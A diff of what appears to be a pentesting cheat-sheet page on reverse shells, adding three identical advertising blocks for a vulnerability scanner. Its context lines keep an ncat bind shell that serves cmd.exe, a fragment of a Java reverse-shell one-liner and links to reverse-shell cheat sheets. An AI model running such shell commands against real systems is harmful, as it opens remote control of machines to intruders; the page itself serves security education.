@@ -12,6 +12,14 @@
 
 </details>
 
+<figure><img src="../.gitbook/assets/image (674).png" alt=""><figcaption></figcaption></figure>
+
+Find vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.
+
+{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
+
+***
+
 **If you have questions about any of these shells you could check them with** [**https://explainshell.com/**](https://explainshell.com)
 
 ## Full TTY
@@ -169,6 +177,14 @@ p.waitFor()
 victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
 attacker> ncat -v 10.0.0.22 4444 --ssl
 ```
+
+<figure><img src="../.gitbook/assets/image (674).png" alt=""><figcaption></figcaption></figure>
+
+Find vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.
+
+{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
+
+***
 
 ## Golang
 
@@ -357,6 +373,13 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 {% embed url="https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/" %}
 
 {% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" %}
+
+<figure><img src="../.gitbook/assets/image (674).png" alt=""><figcaption></figcaption></figure>
+
+Find vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.
+
+{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
+
 
 <details>
 
